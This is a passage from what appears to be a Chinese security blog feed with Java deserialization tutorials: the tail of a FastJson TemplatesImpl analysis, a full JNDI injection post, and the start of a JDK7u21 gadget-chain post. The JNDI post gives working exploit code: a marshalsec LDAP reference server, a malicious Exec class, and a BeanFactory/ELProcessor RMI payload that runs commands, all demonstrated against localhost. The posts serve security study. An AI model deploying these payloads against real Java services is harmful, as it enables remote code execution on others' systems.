src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/22.png"></p><p>跟进bytesValue()函数，就是对<code>_bytecodes</code>的内容进行Base64解码：<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/23.png"></p><h3 id="为什么反序列化调用getter方法时会调用到TemplatesImpl-getOutputProperties-方法"><a href="#为什么反序列化调用getter方法时会调用到TemplatesImpl-getOutputProperties-方法" class="headerlink" title="为什么反序列化调用getter方法时会调用到TemplatesImpl.getOutputProperties()方法"></a>为什么反序列化调用getter方法时会调用到TemplatesImpl.getOutputProperties()方法</h3><p>getOutputProperties()方法是个无参数的非静态的getter方法，以get开头且第四个字母为大写形式，其返回值类型是Properties即继承自Map类型，满足Fastjson反序列化时会调用的getter方法的条件，因此在使用Fastjson对TemplatesImpl类对象进行反序列化操作时会自动调用getOutputProperties()方法。</p><h3 id="如何关联-outputProperties与getOutputProperties-方法"><a href="#如何关联-outputProperties与getOutputProperties-方法" class="headerlink" title="如何关联_outputProperties与getOutputProperties()方法"></a>如何关联_outputProperties与getOutputProperties()方法</h3><p>Fastjson会语义分析JSON字符串，根据字段key，调用fieldList数组中存储的相应方法进行变量初始化赋值。</p><p>具体的代码在JavaBeanDeserializer.parseField()中，其中调用了smartMatch()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">parseField</span><span class="params">(DefaultJSONParser parser, String key, Object object, Type objectType, Map&lt;String, Object&gt; fieldValues)</span> &#123;  </span><br><span class="line">    <span class="type">JSONLexer</span> <span class="variable">lexer</span> <span class="operator">=</span> parser.lexer; <span class="comment">// xxx  </span></span><br><span class="line">    <span class="type">FieldDeserializer</span> <span class="variable">fieldDeserializer</span> <span class="operator">=</span> smartMatch(key);</span><br></pre></td></tr></table></figure><p>在JavaBeanDeserializer.smartMatch()方法中，会替换掉字段key中的<code>_</code>，从而使得<code>_outputProperties</code>变成了outputProperties：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/24.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-JNDI注入</title>
      <link href="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇不讲 基础，直接讲jdk版本的绕过，没基础的小伙伴可以看看其他师傅的文章</p><h1 id="8u121-lt-jdk-lt-8u191版本绕过-JNDI-LDAP"><a href="#8u121-lt-jdk-lt-8u191版本绕过-JNDI-LDAP" class="headerlink" title="8u121&lt;jdk&lt;8u191版本绕过(JNDI+LDAP)"></a>8u121&lt;jdk&lt;8u191版本绕过(JNDI+LDAP)</h1><p>除了RMI服务之外，JNDI还可以对接LDAP服务，且LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址如ldap:&#x2F;&#x2F;xxx&#x2F;xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。</p><p>注意 java 版本 我这里使用的是 jdk8u141<br>使用 <a href="https://github.com/RandomRobbieBF/marshalsec-jar">marshalsec</a>构建ldap服务,服务端监听:</p><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:7777/#Exec 1099 </code><br><code>http://127.0.0.1:7777/为本地服务，Exec是恶意文件，1099是开启的ldap服务端口(默认为1389) </code></p><p>在exec 目录下开启本地服务：</p><p><code>python -m http.server 7777 </code></p><p>JNDILADPClient.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line">public class JNDILDAPClient &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        InitialContext initialContext = new InitialContext();</span><br><span class="line">        initialContext.lookup(&quot;ldap://127.0.0.1:1099/Exec&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Exec.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Exec &#123;</span><br><span class="line">    public Exec() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Client运行发起请求</p><p><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/1.jpg"></p><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>在lookup处打断点：</p><p><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/2.png"></p><p>在一路的 lookup 后 来到 p_lookup</p><p><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/3.png"></p><p>然后又调用 c_lookup()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">protected Object p_lookup(Name var1, Continuation var2) throws NamingException &#123;</span><br><span class="line">    Object var3 = null;</span><br><span class="line">    HeadTail var4 = this.p_resolveIntermediate(var1, var2);</span><br><span class="line">    switch (var4.getStatus()) &#123;</span><br><span class="line">        case 2:</span><br><span class="line">            var3 = this.c_lookup(var4.getHead(), var2);</span><br><span class="line">            if (var3 instanceof LinkRef) &#123;</span><br><span class="line">                var2.setContinue(var3, var4.getHead(), this);</span><br><span class="line">                var3 = null;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 c_lookup 中，在下方会调用 <code>decodeObject()</code>,其中参数的值就是我们传入的LDAP的值</p><p><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/4.jpg"></p><p>跟进 这个decodeObject() </p><p><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/5.jpg"></p><p>这里 会进行if判断判断  ①处若我们传入的是序列化数据则会执行if下方的语句进行反序列化(<code>后边高版本绕过会用到留个印象</code>)；②若传入的是远程对象则会调用<code>decodeRmiObject()</code>而我们是一个引用所以直接调用③执行<code>decodeReference()</code></p><p><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/6.jpg"></p><p>decodeReference() 就是一些简单赋值，没啥实际的调用，执行完 回到 LdapCtx.class中，此时的var3属性为：<br><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/7.jpg"></p><p>现在有类名，地址，那么就是准备查找远程恶意类了，接着往下走，会到DirectoryManager.getObjectInstance() ,而 RMI是调用的NamingManager.getObjectInstace， 都是这样通过调用 getObjectInstance 方法 走出自己类所对应的 getObjectInstance,跟进 :</p><p><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/8.png"></p><p>加载 Exec:</p><p><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/9.jpg"></p><p>所以<code>codebase</code>也就是所谓的远程URL (<code>http://127.0.0.1:7777/</code>)。然后在这个URL的基础上去找文件：</p><p><code>clas = helper.loadClass(factoryName, codebase);</code></p><p>调用Class.forName并制定了类加载来加载类，这样可以加载到<code>http://127.0.0.1:7777/Exec.class</code>。再联想一下之前的知识，Class.forName加载类且第二个参数是true（默认也是true）会进行类的加载，也就是静态代码块。因此这时候静态代码块的代码可以执行。</p><p><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/10.jpg"><br>成功加载到了clas后，再 <code>return (clas != null) ? (ObjectFactory) clas.newInstance() : null;</code>，调用它的newInstance()，从而调用了无参构造器，执行了无参构造器里面的代码，这也是为什么我们把恶意代码写道无参构造器里面的原因。<br><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/11.png"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>至此跟踪完毕，知道了为什么可以调用静态代码块，无参构造器。还有在图5的一点就是 JNDI支持传入的类型有三种：</p><ul><li>序列化对象 –&gt; 对应<code>deserializeObject((byte[])attr.get(), cl);</code></li></ul><p>​</p><ul><li>远程对象 –&gt; 对应<code>decodeRmiObject((String)attrs.get(JAVA_ATTRIBUTES[CLASSNAME]).get(),(String)attr.get(), codebases);</code><br>​</li><li>ldap对象 –&gt; 对应<code>decodeReference(attrs, codebases);</code>​<br>这里因为我们是一个引用对象，所以他会走到​<code>decodeReference(attrs, codebases);</code>​<br>在​<code>decodeReference</code>​这个里面呢主要就是获取恶意类的类名，地址之类的，解析完成：</li></ul><p>因为我们这里用的是引用对象，而高版本会用到另外两个。</p><h1 id="高版本绕过-JDK-gt-8u191"><a href="#高版本绕过-JDK-gt-8u191" class="headerlink" title="高版本绕过(JDK&gt;8u191)"></a>高版本绕过(JDK&gt;8u191)</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在 8u191 之后，LDAP那里加了一个 trustURLCodebase 判断， 无法再用 LDAP 加载。因此，LDAP 和RMI 都无法使用，我们想要从 远程加载类就变的很困难，虽然无法再使用远程加载类，但绕过限制的方法也随之出现。代码的逻辑：<br>从本地尝试加载类-&gt;加载不到则从远程加载类<br>那么无法从远程加载类，是否可以从本机尝试加载这个类，并达到RCE的目的呢？</p><h2 id="基本方法"><a href="#基本方法" class="headerlink" title="基本方法"></a>基本方法</h2><ol><li>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</li><li>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</li></ol><h2 id="利用本地-Class-作为-Reference-Factory"><a href="#利用本地-Class-作为-Reference-Factory" class="headerlink" title="利用本地 Class 作为 Reference Factory"></a>利用本地 Class 作为 Reference Factory</h2><p>之前了解的 JNDI 知道 恶意代码是写在 static ，无参构造器中，如果要利用本地 class 作为 Reference Fatory ，必须要满足三个条件。</p><ul><li>实现了 javax.naming.spi.ObjectFactory 接口</li><li>因为​<code>RegistryContext</code>​是RMI对应的利用类即利用RMI且不加载远程地址就会执行这个利用链。而<code>NamingManager.getObjectInstance</code> ​又会执行<code>getObjectFactoryFromReference</code>​<br>  <code>getObjectFactoryFromReference</code> ​这是一个静态方法，这个静态方法会返回<code>ObjectFactory</code>​类型,并且这里使用了newInstance构造，所以这个类还需要满足拥有无参构造方法</li></ul><p>看到 ObjectFactory 此接口 ，拥有  getObjectInstance 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,Hashtable&lt;?,?&gt; environment)</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚好 <code>org.apache.naming.factory.BeanFactory</code>​ 满足要求，在 BeanFacory 中 的 <code>getObjectInstance</code>​可以精心构造，从而执行恶意代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;  </span><br><span class="line">        NamingException ne;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference)obj;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">beanClassName</span> <span class="operator">=</span> ref.getClassName();  </span><br><span class="line">            Class&lt;?&gt; beanClass = <span class="literal">null</span>;  </span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">tcl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();  </span><br><span class="line">            <span class="keyword">if</span> (tcl != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="keyword">try</span> &#123;  </span><br><span class="line">                    beanClass = tcl.loadClass(beanClassName);  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var26) &#123;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="keyword">try</span> &#123;  </span><br><span class="line">                    beanClass = Class.forName(beanClassName);  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var25) &#123;  </span><br><span class="line">                    var25.printStackTrace();  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> (beanClass == <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Class not found: &quot;</span> + beanClassName);  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="type">BeanInfo</span> <span class="variable">bi</span> <span class="operator">=</span> Introspector.getBeanInfo(beanClass);  </span><br><span class="line">                PropertyDescriptor[] pda = bi.getPropertyDescriptors();  </span><br><span class="line">                <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> beanClass.newInstance();  </span><br><span class="line">                <span class="type">RefAddr</span> <span class="variable">ra</span> <span class="operator">=</span> ref.get(<span class="string">&quot;forceString&quot;</span>);  </span><br><span class="line">                Map&lt;String, Method&gt; forced = <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">                String value;  </span><br><span class="line">                String propName;  </span><br><span class="line">                <span class="type">int</span> i;  </span><br><span class="line">                <span class="keyword">if</span> (ra != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    value = (String)ra.getContent();  </span><br><span class="line">                    Class&lt;?&gt;[] paramTypes = <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;;  </span><br><span class="line">                    String[] arr$ = value.split(<span class="string">&quot;,&quot;</span>);  </span><br><span class="line">                    i = arr$.length;  </span><br><span class="line">  </span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; i; ++i$) &#123;  </span><br><span class="line">                        <span class="type">String</span> <span class="variable">param</span> <span class="operator">=</span> arr$[i$];  </span><br><span class="line">                        param = param.trim();  </span><br><span class="line">                        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> param.indexOf(<span class="number">61</span>);  </span><br><span class="line">                        <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;  </span><br><span class="line">                            propName = param.substring(index + <span class="number">1</span>).trim();  </span><br><span class="line">                            param = param.substring(<span class="number">0</span>, index).trim();  </span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                            propName = <span class="string">&quot;set&quot;</span> + param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) + param.substring(<span class="number">1</span>);  </span><br><span class="line">                        &#125;  </span><br><span class="line">  </span><br><span class="line">                        <span class="keyword">try</span> &#123;  </span><br><span class="line">                            forced.put(param, beanClass.getMethod(propName, paramTypes));  </span><br><span class="line">                        &#125; <span class="keyword">catch</span> (SecurityException | NoSuchMethodException var24) &#123;  </span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Forced String setter &quot;</span> + propName + <span class="string">&quot; not found for property &quot;</span> + param);  </span><br><span class="line">                        &#125;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">  </span><br><span class="line">                Enumeration&lt;RefAddr&gt; e = ref.getAll();  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">while</span>(<span class="literal">true</span>) &#123;  </span><br><span class="line">                    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;  </span><br><span class="line">                        <span class="keyword">do</span> &#123;  </span><br><span class="line">                            <span class="keyword">do</span> &#123;  </span><br><span class="line">                                <span class="keyword">do</span> &#123;  </span><br><span class="line">                                    <span class="keyword">do</span> &#123;  </span><br><span class="line">                                        <span class="keyword">do</span> &#123;  </span><br><span class="line">                                            <span class="keyword">if</span> (!e.hasMoreElements()) &#123;  </span><br><span class="line">                                                <span class="keyword">return</span> bean;  </span><br><span class="line">                                            &#125;  </span><br><span class="line">  </span><br><span class="line">                                            ra = (RefAddr)e.nextElement();  </span><br><span class="line">                                            propName = ra.getType();  </span><br><span class="line">                                        &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;factory&quot;</span>));  </span><br><span class="line">                                    &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;scope&quot;</span>));  </span><br><span class="line">                                &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;auth&quot;</span>));  </span><br><span class="line">                            &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;forceString&quot;</span>));  </span><br><span class="line">                        &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;singleton&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">                        value = (String)ra.getContent();  </span><br><span class="line">                        Object[] valueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">1</span>];  </span><br><span class="line">                        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> (Method)forced.get(propName);  </span><br><span class="line">                        <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;  </span><br><span class="line">                            valueArray[<span class="number">0</span>] = value;  </span><br><span class="line">  </span><br><span class="line">                            <span class="keyword">try</span> &#123;  </span><br><span class="line">                                method.invoke(bean, valueArray);</span><br></pre></td></tr></table></figure><p>简单来说就是 实例化了 Bean.class  然后调用一个 setter 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> beanClass.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">Method method = (Method)forced.get(propName);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"></span><br><span class="line">method.invoke(bean, valueArray);</span><br></pre></td></tr></table></figure><p>实际上 并不一定是 setter ，可以使某个函数为setter ，只不过要调用的函数必须是参数为一个String 的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">paramTypes[<span class="number">0</span>] = String.class;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用<code>javax.el.ELProcessor</code>来rce即可。<code>ELProcessor</code>的eval方法会对EL表达式求值，实现RCE。不过前提是tomcat8，因为tomcat7中没有<code>ELProcessor</code>。</p><p>Server：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>,<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">39654</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;kuis=eval&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;kuis&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>test</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:39654/Exploit&quot;</span>;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-原生反序列化利用链JDK7u21</title>
      <link href="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/"/>
      <url>/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/</url>
      
        <content type="html"><![CDATA[<h1 id="说两句"><a href="#说两句" class="headerlink" title="说两句"></a>说两句</h1><p>在前面的分析利用链中，大部分都基于 InvokerTransformer 和 TemplatesImpl 这两个类去执行命令，而其他的一些利用链也是经过这两个类去进行变形，从而产生新的利用链，而在Jdk7u21中，也是基于 TemplatesImpl 去实现的，另一个核心点就是 </p><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code></p><p>我们先来看看 这个老朋友AnnotationInvocationHandler类中的equalsImpl方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">private Boolean equalsImpl(Object var1) &#123;  </span><br><span class="line">    if (var1 == this) &#123;  </span><br><span class="line">        return true;  </span><br><span class="line">    &#125; else if (!this.type.isInstance(var1)) &#123;  </span><br><span class="line">        return false;  </span><br><span class="line">    &#125; else &#123;  </span><br><span class="line">        Method[] var2 = this.getMemberMethods();  </span><br><span class="line">        int var3 = var2.length;  </span><br><span class="line">  </span><br><span class="line">        for(int var4 = 0; var4 &lt; var3; 